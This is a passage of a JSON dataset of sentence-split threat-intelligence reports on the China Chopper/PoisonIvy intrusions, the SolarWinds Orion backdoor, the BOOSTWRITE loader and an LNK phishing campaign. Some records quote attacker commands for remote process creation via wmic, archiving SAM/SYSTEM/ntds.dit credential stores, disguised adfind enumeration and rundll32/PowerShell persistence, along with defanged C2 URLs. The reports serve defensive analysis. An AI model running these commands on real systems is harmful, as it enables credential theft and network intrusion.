        "text": "In order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S19",
        "text": "They dumped specific hives from the Windows Registry, such as the SAM hive, which contains password hashes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S20",
        "text": "Once the threat actor mapped the network and obtained credentials (through net use), they began to move laterally.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S21",
        "text": "They were able to compromise critical assets including production servers and database servers, and they even managed to gain full control of the Domain Controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S22",
        "text": "The threat actor relied on WMI and PsExec to move laterally and install their tools across multiple assets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S23",
        "text": "The following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S24",
        "text": "/c cd /d \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\\"&wmic /node:[REDACTED] /user:\"[REDACTED]\" /password:\"[REDACTED]\" process call create a.bat&echo [S]&cd&echo [E]",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S25",
        "text": "The threat actor abused the stolen credentials to create rogue, high-privileged domain user accounts which they then used to take malicious action.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S26",
        "text": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S27",
        "text": "Once the threat actor regains their foothold, they already have access to a high-privileged domain user account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S28",
        "text": "This significantly reduces the \u201cnoise\u201d of having to use credential dumpers repeatedly, which helped them evade detection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S29",
        "text": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S30",
        "text": "This infamous RAT has been associated with many different Chinese threat actors, including APT10, APT1, and DragonOK.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S31",
        "text": "It is a powerful, multi-featured RAT that lets a threat actor take total control over a machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S32",
        "text": "Among its most notable features are:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S33",
        "text": "- Registry Editor",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S34",
        "text": "- Screenshot Grabber",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S35",
        "text": "- Credential Stealer",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S36",
        "text": "- Interactive Shell",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S37",
        "text": "- File Manager with Upload and Download Support\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S38",
        "text": "- Process Monitor",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S39",
        "text": "- Keylogging and Various other Surveillance Features\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S40",
        "text": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S41",
        "text": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S42",
        "text": "To accomplish this, it exploited a trusted and signed application.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S43",
        "text": "The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S44",
        "text": "- nullsoft installer package (NSIS) was created with a legitimate, signed Samsung tool in it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S45",
        "text": "- Once executed, the installer script within the NSIS package extracted the Samsung tool and added a fake DLL with the same name as a legitimate DLL (ssMUIDLL.dll), which is required by the application.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S46",
        "text": "- The DLL contains a PIVY stager, which is then loaded by the Samsung tool.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S47",
        "text": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S48",
        "text": "- It was able to achieve persistence by creating a rogue scheduled task.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S49",
        "text": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S50",
        "text": "In 2016 it was used to attack pro-democratic activists in Hong Kong, most probably by Chinese threat actors.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S51",
        "text": "\u26a0\ufe0f Note: Our team has reached out to and advised the targeted organizations on active containment actions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S52",
        "text": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S53",
        "text": "From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S54",
        "text": "The threat actor exfiltrated stolen data using multiple different channels including web shells and hTran.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S55",
        "text": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S56",
        "text": "The winrar binaries and compressed data were found mostly in the Recycle Bin folder, a TTP that was previously observed in APT10-related attacks, as well as others.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S57",
        "text": "This threat actor is known to stage the data in multi-part archives before exfiltration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S58",
        "text": "The threat actor used the following commands to compress the data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S59",
        "text": "- rar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].temp\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S60",
        "text": "- rar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].csv\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S61",
        "text": "- rar a -r -[password] [REDACTED].rar sam system ntds.dit",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S62",
        "text": "The contents of the compressed data was crucial in understanding the threat actor\u2019s motivation for the attack, as well as what type of information they were after.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S63",
        "text": "In order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of hTran.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S64",
        "text": "This \u2018connection bouncer\u2019 tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S65",
        "text": "There have been numerous reports of hTran being used by different Chinese threat actors, including: APT3, APT27 and DragonOK.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S66",
        "text": "The threat actor made some modifications to the original source code of hTran.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S67",
        "text": "Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S68",
        "text": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S69",
        "text": "printf is being called (dubbed by us as \u201clooks_like_printf\u201d) with output \u201cC e.\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S70",
        "text": "By looking at the original source code, we were able to identify that this is supposed to be \u201cConnect error\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S0",
        "text": "The attackers inserted malicious code into SolarWinds.Orion.Core.BusinessLayer.dll, a code library belonging to the SolarWinds Orion Platform.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S1",
        "text": "The attackers had to find a suitable place in this DLL component to insert their code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S2",
        "text": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S3",
        "text": "Such a suitable location turns out to be a method named RefreshInternal.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S4",
        "text": "The modification to this function is very lightweight and could be easily overlooked\u2014all it does is to execute the method OrionImprovementBusinessLayer.Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S5",
        "text": "Why was this method chosen rather than other ones?",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S6",
        "text": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S7",
        "text": "The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S8",
        "text": "Among those tasks is Background Inventory, which ultimately starts the malicious code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S9",
        "text": "The functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S10",
        "text": "Its name blends in with the rest of the legitimate code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S11",
        "text": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S12",
        "text": "At first glance, the code in this DLL looks normal and doesn\u2019t raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S13",
        "text": "To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S14",
        "text": "The Initialize method is the de facto execution entry point of the backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S15",
        "text": "It carries out several checks to verify that it is running in a real victim\u2019s environment:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S16",
        "text": "- It verifies that the process hosting the malicious DLL is named solarwinds.businesslayerhost.exe\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S17",
        "text": "- It checks that the last write-time of the malicious DLL is at least 12 to 14 days earlier\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S18",
        "text": "- It delays execution by random amounts of time\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S19",
        "text": "- It verifies that the domain name of the current device meets the following conditions: \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S20",
        "text": "  - The domain must not contain certain strings; the check for these strings is implemented via hashes, so at this time the domain names that are block-listed are unknown \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S21",
        "text": "  - The domain must not contain \u201csolarwinds\u201d \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S22",
        "text": "  - The domain must not match the regular expression (?i)([^a-z]|^)(test)([^a-z]|$), or in simpler terms, it must not look like a test domain",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S23",
        "text": "- It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S24",
        "text": "- It checks that there are no drivers loaded from security-related software (e.g., groundling32.sys)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S25",
        "text": "- It checks that the status of certain services belonging to security-related software meets certain conditions (e.g., windefend, sense, cavp)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S26",
        "text": "- It checks that the host \u201capi.solarwinds.com\u201d resolves to an expected IP address\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S27",
        "text": "If any of these checks fail, the backdoor terminates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S28",
        "text": "All these inspections are carried out to avoid exposing the malicious functionality to unwanted environments, such as test networks or machines belonging to SolarWinds.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S29",
        "text": "After the extensive validation described above, the backdoor enters its main execution stage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S30",
        "text": "At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S31",
        "text": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S32",
        "text": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S33",
        "text": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S34",
        "text": "This means that every affected device generates a different subdomain to contact (and possibly more than one).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S35",
        "text": "Here\u2019s an example of a generated domain:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S36",
        "text": "The dynamically generated portion of the domain is the interesting part.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S37",
        "text": "It is computed by hashing the following data:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S38",
        "text": "- The physical address of the network interface\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S39",
        "text": "- The domain name of the device",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S40",
        "text": "- The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S41",
        "text": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S42",
        "text": "Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S43",
        "text": "Possible URIs that can be generated follow these formats:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S44",
        "text": "- pki/crl/<random components>.crl, where <random components> can be numbers and one of the following strings: \u201c-root\u201d \u201c-cert\u201d \u201c-universal_ca\u201d \u201c-ca\u201d \u201c-primary_ca\u201d \u201c-timestamp\u201d \u201c-global\u201d \u201c-secureca\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S45",
        "text": "- fonts/woff/<random components>-webfont<random component>.woff2 or fonts/woff/<random components>.woff2, where the <random components> can be numbers and one or more of the following strings: \u201cBold\u201d \u201cBoldItalic\u201d \u201cExtraBold\u201d \u201cExtraBoldItalic\u201d \u201cItalic\u201d, \u201cLight\u201d \u201cLightItalic\u201d \u201cRegular\u201d \u201cSemiBold\u201d \u201cSemiBoldItalic\u201d \u201copensans\u201d \u201cnoto\u201d \u201cfreefont\u201d \u201cSourceCodePro\u201d \u201cSourceSerifPro\u201d \u201cSourceHanSans\u201d \u201cSourceHanSerif\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S46",
        "text": "- swip/upd/<random components>, where <random components> can be one or more of the following strings: \u201cSolarWinds\u201d \u201c.CortexPlugin\u201d \u201c.Orion\u201d \u201cWireless\u201d \u201cUI\u201d \u201cWidgets\u201d \u201cNPM\u201d \u201cApollo\u201d \u201cCloudMonitoring\u201d \u201cNodes\u201d, \u201cVolumes\u201d, \u201cInterfaces\u201d, \u201cComponents\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S47",
        "text": "- swip/Upload.ashx",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S48",
        "text": "- swip/Events",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S49",
        "text": "Here are examples of final URLs generated by the backdoor:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S50",
        "text": "- hxxps://3mu76044hgf7shjf[.]appsync-api[.]eu-west-1[.]avsvmcloud[.]com /swip/upd/Orion[.]Wireless[.]xml",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S51",
        "text": "- hxxps://3mu76044hgf7shjf[.]appsync-api[.]us-east-2[.]avsvmcloud[.]com /pki/crl/492-ca[.]crl",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S52",
        "text": "- hxxps://3mu76044hgf7shjf[.]appsync-api[.]us-east-1[.]avsvmcloud[.]com /fonts/woff/6047-freefont-ExtraBold[.]woff2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S53",
        "text": "Finally, the backdoor composes a JSON document into which it adds the unique user ID described earlier, a session ID, and a set of other non-relevant data fields.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S54",
        "text": "It then sends this JSON document to the C2 server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S55",
        "text": "If the communication is successful, the C2 responds with an encoded, compressed buffer of data containing commands for the backdoor to execute.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S56",
        "text": "The C2 might also respond with information about an additional C2 address to report to.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S57",
        "text": "The backdoor accepts the following commands:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S58",
        "text": "- Idle",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S59",
        "text": "- Exit",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S60",
        "text": "- SetTime",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S61",
        "text": "- CollectSystemDescription",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S62",
        "text": "- UploadSystemDescription",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S63",
        "text": "- RunTask",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S64",
        "text": "- GetProcessByDescription",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S65",
        "text": "- KillTask",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S66",
        "text": "- GetFileSystemEntries\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S67",
        "text": "- WriteFile",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S68",
        "text": "- FileExists",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S69",
        "text": "- DeleteFile",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S70",
        "text": "- GetFileHash",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S71",
        "text": "- ReadRegistryValue",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S72",
        "text": "- SetRegistryValue",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S73",
        "text": "- DeleteRegistryValue",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S74",
        "text": "- GetRegistrySubKeyAndValueNames",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S75",
        "text": "- Reboot",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S76",
        "text": "- None",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S77",
        "text": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S78",
        "text": "The command CollectSystemDescription retrieves the following information:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S79",
        "text": "- Local Computer Domain name",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S80",
        "text": "- Administrator Account SID",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S81",
        "text": "- HostName",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S82",
        "text": "- Username",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S83",
        "text": "- OS Version",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S84",
        "text": "- System Directory",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S85",
        "text": "- Device uptime",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S86",
        "text": "- Information about the network interfaces\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S87",
        "text": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S88",
        "text": "To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S89",
        "text": "C:\\Windows\\system32\\cmd.exe /C csrss.exe -h breached.contoso.com -f (name=\u201dDomain Admins\u201d) member -list | csrss.exe -h breached.contoso.com -f objectcategory=* > .\\Mod\\mod1.log",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S90",
        "text": "Lateral movement was observed via PowerShell remote task creation, as detailed by FireEye and Volexity:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S91",
        "text": "Persistence is achieved via backdoors deployed via various techniques:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S92",
        "text": "- PowerShell:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S93",
        "text": "  - Powershell -nop -exec bypass -EncodedCommand\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S94",
        "text": "  - The \u2013EncodedCommand, once decoded, would resemble:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S95",
        "text": "  - Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S96",
        "text": "- Rundll32:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S97",
        "text": "  - C:\\Windows\\System32\\rundll32.exe C:\\Windows\\Microsoft.NET\\Framework64\\[malicious .dll file], [various exports]\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S98",
        "text": "  - With Rundll32, each compromised device receives a unique binary hash, unique local filesystem path, pseudo-unique export, and unique C2 domain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S99",
        "text": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S100",
        "text": "We continue to investigate these payloads, which are detected as Trojan:Win32/Solorigate.A!dha, as the situation continues to unfold.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S0",
        "text": "BOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications which load the legitimate \u2018Dwrite.dll\u2019 provided by the Microsoft DirectX Typography Services.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S1",
        "text": "The application loads the \u2018gdi\u2019 library, which loads the \u2018gdiplus\u2019 library, which ultimately loads \u2018Dwrite\u2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S2",
        "text": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S3",
        "text": "Once loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S4",
        "text": "To accomplish this task, the malware first generates a random file name to be used as a text log under the current user's %TEMP% directory; this filename starts with ~rdf and is followed by a set of random numbers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S5",
        "text": "Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S6",
        "text": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S7",
        "text": "The encryption algorithm uses the ChaCha stream cipher with a 256-bit key and 64-bit IV.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S8",
        "text": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S9",
        "text": "The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the filesystem.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S10",
        "text": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S11",
        "text": "An example of the file content is shown in Figure 1:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S12",
        "text": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S13",
        "text": "The malware decrypts and loads two payload DLLs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S14",
        "text": "One of the DLLs is an instance of the CARBANAK backdoor; the other DLL is a tool tracked by FireEye as RDFSNIFFER which allows an attacker to hijack instances of the NCR Aloha Command Center Client application and interact with victim systems via existing legitimate 2FA sessions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S15",
        "text": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation\u2019s \u2018Aloha Command Center Client\u2019 (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S16",
        "text": "RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility\u2019s DLL load order, launching each time the \u2018Aloha Command Center Client\u2019 is executed on an impacted system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S17",
        "text": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S18",
        "text": "Furthermore, this enables the malware to alter the user\u2019s last input time to ensure application sessions do not time out.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S19",
        "text": "This module also contains a backdoor component that enables it to inject commands into an active RDFClient session.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S20",
        "text": "This backdoor allows an attacker to upload, download, execute and/or delete arbitrary files (Table 2).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S0",
        "text": "The threat actors used a malicious LNK file bundled within an archive file which was most likely distributed via spear-phishing.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S1",
        "text": "We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S2",
        "text": "- \"CV_Colliers.rar\"",
        "type": ""
    },
    {
